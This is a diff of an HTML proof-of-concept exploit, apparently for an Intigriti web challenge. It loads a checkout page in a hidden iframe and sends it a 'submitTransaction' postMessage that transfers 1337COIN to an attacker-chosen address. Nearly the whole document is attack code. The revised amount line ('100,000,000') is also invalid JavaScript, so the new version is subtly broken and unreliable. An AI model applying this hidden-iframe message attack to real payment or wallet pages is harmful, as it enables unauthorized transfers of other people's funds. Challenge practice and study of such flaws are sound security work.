@@ -1,36 +1,22 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>POC</title>
+</head>
 <body>
-
-<iframe
-    id="checkout"
-    src="https://app.intigriti.com/checkout.html?currency=1337COIN&price=1"
-    style="display:none">
-</iframe>
-
-<script>
-function sendTx() {
-    document.getElementById('checkout').contentWindow.postMessage({
+  <iframe id="exploitFrame" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none;"></iframe>
+  <script>
+    const iframe = document.getElementById('exploitFrame');
+    iframe.onload = function() {
+      iframe.contentWindow.postMessage({
         type: 'submitTransaction',
         transaction: {
-            currency: '1337COIN',
-            amount: 1,
-            toAddress: '174094f246eb6712e885d470519c0ad4d4'
+          toAddress: '166157bd29ab30b445a1d0d11f08b3126e',  // Replace with your address from step 2
+          currency: '1337COIN',
+          amount: 100,000,000   // Assuming admin has 1 unit; adjust if needed based on marketwatch.html
         }
-    }, '*');
-}
-
-// fire multiple times to catch the exact ready window
-let attempts = 0;
-const interval = setInterval(() => {
-    attempts++;
-    sendTx();
-
-    if (attempts > 10) {
-        clearInterval(interval);
-    }
-}, 1000);
-</script>
-
+      }, '*');
+    };
+  </script>
 </body>
 </html>
